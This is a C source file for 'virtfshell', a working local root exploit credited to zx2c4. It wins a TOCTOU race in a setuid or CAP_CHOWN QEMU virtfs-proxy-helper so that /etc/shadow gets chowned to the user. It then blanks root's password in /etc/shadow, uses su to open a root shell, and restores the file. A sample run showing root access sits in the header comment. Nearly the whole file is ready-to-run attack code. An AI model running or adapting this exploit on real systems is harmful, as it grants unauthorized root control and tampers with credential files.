
/* == virtfshell ==
 *
 * Some distributions make virtfs-proxy-helper from QEMU either SUID or
 * give it CAP_CHOWN fs capabilities. This is a terrible idea. While
 * virtfs-proxy-helper makes some sort of flimsy check to make sure
 * its socket path doesn't already exist, it is vulnerable to TOCTOU.
 *
 * This should spawn a root shell eventually on vulnerable systems.
 *
 * - zx2c4
 * 2015-12-12
 *
 *
 * zx2c4@thinkpad ~ $ lsb_release -i
 * Distributor ID: Gentoo
 * zx2c4@thinkpad ~ $ ./virtfshell 
 * == Virtfshell - by zx2c4 ==
 * [+] Trying to win race, attempt 749
 * [+] Chown'd /etc/shadow, elevating to root
 * [+] Cleaning up
 * [+] Spawning root shell
 * thinkpad zx2c4 # whoami
 * root
 *
 */

#include <stdio.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/inotify.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>


static int it_worked(void)
{
	struct stat sbuf = { 0 };
	stat("/etc/shadow", &sbuf);
	return sbuf.st_uid == getuid() && sbuf.st_gid == getgid();
}

int main(int argc, char **argv)
{
	int fd;
	pid_t pid;
	char uid[12], gid[12];
	size_t attempts = 0;

	sprintf(uid, "%d", getuid());
	sprintf(gid, "%d", getgid());

	printf("== Virtfshell - by zx2c4 ==\n");

	printf("[+] Beginning race loop\n");

	while (!it_worked()) {
		printf("\033[1A\033[2K[+] Trying to win race, attempt %zu\n", ++attempts);
		fd = inotify_init();
		unlink("/tmp/virtfshell/sock");
		mkdir("/tmp/virtfshell", 0777);
		inotify_add_watch(fd, "/tmp/virtfshell", IN_CREATE);
		pid = fork();
		if (pid == -1)
			continue;
		if (!pid) {
			close(0);
			close(1);
			close(2);
			execlp("virtfs-proxy-helper", "virtfs-proxy-helper", "-n", "-p", "/tmp", "-u", uid, "-g", gid, "-s", "/tmp/virtfshell/sock", NULL);
			_exit(1);
		}
		read(fd, 0, 0);
		unlink("/tmp/virtfshell/sock");
		symlink("/etc/shadow", "/tmp/virtfshell/sock");
		close(fd);
		kill(pid, SIGKILL);
		wait(NULL);
	}

	printf("[+] Chown'd /etc/shadow, elevating to root\n");

	system(	"cp /etc/shadow /tmp/original_shadow;"
		"sed 's/^root:.*/root::::::::/' /etc/shadow > /tmp/modified_shadow;"
		"cat /tmp/modified_shadow > /etc/shadow;"
		"su -c '"
		"	echo [+] Cleaning up;"
		"	cat /tmp/original_shadow > /etc/shadow;"
		"	chown root:root /etc/shadow;"
		"	rm /tmp/modified_shadow /tmp/original_shadow;"
		"	echo [+] Spawning root shell;"
		"	exec /bin/bash -i"
		"'");
	return 0;
}